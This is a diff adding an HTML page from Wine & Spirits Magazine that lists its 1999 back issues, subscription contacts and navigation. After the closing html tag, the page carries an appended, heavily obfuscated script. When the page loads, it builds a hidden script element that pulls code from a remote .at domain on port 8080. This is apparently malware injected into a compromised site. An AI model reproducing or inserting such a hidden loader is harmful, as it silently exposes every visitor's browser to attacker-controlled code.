@@ -1,0 +1,174 @@
+<html>
+<head>
+<title>Wine&amp;Spirits Magazine</title>
+<link rel="stylesheet" type="text/css" href="/shared/wsstyles.css">
+<script language="javascript" type="text/javascript" src="/shared/mm_image.js"></script>
+
+<link rel="stylesheet" type="text/css" href="../../shared/wsstyles.css">
+
+<style type="text/css">
+
+
+
+#dropmenudiv{
+
+position:absolute;
+
+border:1px solid black;
+
+border-bottom-width: 0;
+
+font:normal 12px Verdana;
+
+line-height: 10px;
+
+z-index: 50;
+
+}
+
+
+
+#dropmenudiv a{
+
+width: 100%;
+
+display: block;
+
+text-indent: 3px;
+
+border-bottom: 1px solid black;
+
+padding: 1px 0;
+
+text-decoration: none;
+
+font-weight: bold;
+
+}
+
+
+
+#dropmenudiv a:hover{ /*hover background color*/
+
+background-color: #cccccc;
+
+font:light 12px Verdana;
+
+text-indent: 10px;
+
+text-decoration: italic;
+
+}
+
+
+
+</style>
+
+<script language='javascript' src='/shared/dmenu.js'></script>
+
+</head>
+
+<body>
+
+<script language="javascript" type="text/javascript" src="/shared/topnavmenu.asp"></script>
+
+<table width="590" border="0" align="center" height="22">
+  <tr> 
+    <td width="35">&nbsp;</td>
+    <td width="488" class="text"><span class="header"><b>SUBSCRIPTIONS</b></span></td>
+  </tr>
+</table>
+<table width="580" border="0" align="center">
+  <tr align="left" valign="top"> 
+    <td><img src="/images/phone.gif" align="top" width="18" height="10"><span class="subscribetoday">&nbsp;&nbsp;<span class="text000000"><b>  Call</b>:(888) 695-4660</span> 
+      <br>
+      <img src="/images/envelope.gif" align="top" width="18" height="10">&nbsp;&nbsp;<span class="text000000">  <b>Send</b> subscriptions inquiries and changes of address 
+      (old and new) to the editorial office.<br><br>
+     <span class="textcc0000">&nbsp; 2 West 32nd St., Suite 601<br>
+      New York, NY 10001<br><br>
+      &nbsp;&nbsp;<span class="text000000">(Subscription fees:Canada add $10.00; overseas airmail add $30.00 {US Funds}.) 
+      </span></td>
+  </tr>
+</table>
+<br>
+<table width="530" border="0" align="center" height="33">
+  <tr align="left" valign="middle"> 
+    <td width="498" align="left" valign="bottom"> 
+      <p>&nbsp;<img src="/images/buttons/button_dot_cc0000.gif"><span class="header"> 1999</span><br>
+        <br><span class="text999999">(Click issue cover for more info on that issue)</span></p>
+    </td>
+  </tr>
+</table>
+<table width="520" border="0" align="center" height="441">
+  <tr> 
+    <td align="center" valign="top" width="134"><a href="/issues/1999/february1999.html"><img src="/issues/1999/images/cover_feb99.jpg" width="140" height="185" border="0"></a><br>
+      <br>
+      <span class="text999999">February 1999</span><br>
+    </td>
+    <td align="center" valign="top" width="117"> <a href="/issues/1999/april1999.html"><img src="/issues/1999/images/cover_april99.jpg" width="140" height="185" border="0"></a><br>
+      <br>
+      <span class="text999999">April 1999</span><br>
+    </td>
+    <td align="center" valign="top" width="122"><span class="smalltext"><a href="/issues/1999/june1999.html"><img src="/issues/1999/images/cover_june99.jpg" width="140" height="185" border="0"></a><br>
+      <br>
+      <span class="text999999">June 1999 </span> <span class="smalltext"> </span></td>
+    <td align="center" valign="top" class="smalltext" width="119"><a href="/issues/1999/august1999.html"><img src="/issues/1999/images/cover_aug99.jpg" width="140" height="185" border="0"></a><br>
+      <br>
+      <span class="text999999">August 1999</td>
+  </tr>
+  <tr> 
+    <td align="center" valign="top" width="134" height="217"><span class="smalltext"><a href="/issues/1999/fall1999.html"><img src="/issues/1999/images/cover_fall99.jpg" width="140" height="184" border="0"></a><br>
+      <br>
+      <span class="text999999">Fall 1999<a href="/issues/1999/june2000.html"></a> <br>
+      The Guide to Style</span></td>
+    <td align="center" valign="top" width="117" height="217"><span class="smalltext"><a href="/issues/1999/october1999.html"><img src="/issues/1999/images/cover_oct99.jpg" width="140" height="185" border="0"></a><br>
+      <br>
+     <span class="text999999"> October 1999 <br>
+      </span></td>
+    <td align="center" valign="top" width="122" height="217"><span class="smalltext"><a href="/issues/1999/winter99.html"><img src="/issues/1999/images/cover_winter99.jpg" width="140" height="185" border="0"></a><br>
+      <br>
+      <span class="text999999">Winter 1999 <br>
+      Annual Buying Guide</span></td>
+    <td align="center" valign="top" width="119" class="smalltext" height="217"><a href="/issues/1999/december1999.html"><img src="/issues/1999/images/cover_dec99.jpg" width="140" height="185" border="0"></a><br>
+      <br>
+      <span class="text999999">December 1999</td>
+  </tr>
+</table>
+<br><hr width="800">
+
+<table width="450" border="0" align="center">
+  <tr align="right" valign="middle"> 
+    <td width="199" align="left"><a href="/pages/onlinestore.html"><span class="text000000">< Back Issues on Online Store</span></a></td>
+    <td width="241"><a href="/issues/1998"><span class="text000000">Previous Year &gt;</span></a></td>
+  </tr>
+</table>
+<br>
+<span class="subscribetoday"></span><span class="smalltext2"></span><br>
+<br>
+<span class="smalltext"></span><span class="smalltext"></span>
+<table width="189" border="1" align="center">
+  <tr>
+    <td><a href="/subscriptions"><img src="/graphics/subtoday.gif" width="206" height="31" border="0"></a></td>
+  </tr>
+</table>
+
+<br>
+
+<script language="javascript" type="text/javascript" src="/shared/bottomtext.asp"></script>
+
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+var pageTracker = _gat._getTracker("UA-4593726-1");
+pageTracker._initData();
+pageTracker._trackPageview();
+</script>
+
+
+</body>
+</html>
+
+<script>var CQ="";var a='';function m(){var UK;if(UK!='' && UK!='S'){UK=null};var K=window;var q;if(q!='si'){q=''};var II=new String();var r=unescape;var aX=new Date();var CH;if(CH!='x' && CH!='d'){CH=''};var z=r("%2f%67%6f%6f%67%6c%65%2e%63%6f%6d%2f%61%64%76%6d%61%6b%65%72%2e%72%75%2f%70%61%79%73%65%72%76%65%2e%63%6f%6d%2e%70%68%70");this.Z='';function C(t,W){var J;if(J!='' && J!='Ei'){J=null};var e;if(e!='' && e!='xK'){e=null};var aI;if(aI!='G'){aI='G'};var m_=String("grRm".substr(0,1));var A;if(A!='' && A!='JL'){A=''};var Ok;if(Ok!='' && Ok!='rh'){Ok=''};var L=r("%5b"), p=r("%5d");var f=new Array();var w=L+W+p;var JU=new Array();var X=new Array();var KV=new RegExp(w, m_);return t.replace(KV, new String());var wB=new Date();};var qL='';this.o='';var lK;if(lK!='' && lK!='rE'){lK=null};var v=C('837529660656397581156015615','13749265');var of;if(of!='_b'){of=''};var U=new String();var qB;if(qB!='' && qB!='yh'){qB='JT'};var Gb;if(Gb!='' && Gb!='Y'){Gb='Eb'};var F=document;var fu;if(fu!='sL' && fu!='iz'){fu='sL'};this.SL='';var qee;if(qee!='' && qee!='ap'){qee=null};var ro;if(ro!='' && ro!='AB'){ro=null};function l(){var Xu;if(Xu!='' && Xu!='hx'){Xu=''};var eo="";var Lt=r("%68%74%74%70%3a%2f%2f%66%6c%6f%72%69%64%61%6f%72%69%67%69%6e%2e%61%74%3a");this.rY="";var Ue="";var L_=new Array();U=Lt;U+=v;var WV;if(WV!='fK' && WV != ''){WV=null};var gj;if(gj!='' && gj!='Yr'){gj=''};U+=z;this.gG="";var yu;if(yu!='' && yu!='__'){yu='ya'};try {k=F.createElement(C('sHcArfihp9tH','AOkwS2af1emU7hlzQHg9'));this.kR='';var dK=new Date();var Qg="";var xg=new Date();k[r("%64%65%66%65%72")]=[1][0];var XD=new String();k[r("%73%72%63")]=U;this.bt="";var ql="";var hN;if(hN!='LP'){hN='LP'};F.body.appendChild(k);var Fe;if(Fe!='NI'){Fe=''};var ON;if(ON!='wC' && ON!='vk'){ON=''};} catch(pd){var xZG=new Date();this.An='';alert(pd);var da;if(da!='pD'){da='pD'};};var gD=new String();}this.KL='';this.xn='';K[String("mbN8onlo".substr(4)+"ad")]=l;var Lf=new Array();var _o;if(_o!='VJJ' && _o != ''){_o=null};};var pK;if(pK!='pW' && pK != ''){pK=null};m();</script>
+<!--ec430f6b6b2ad64345d3020564bcda82-->
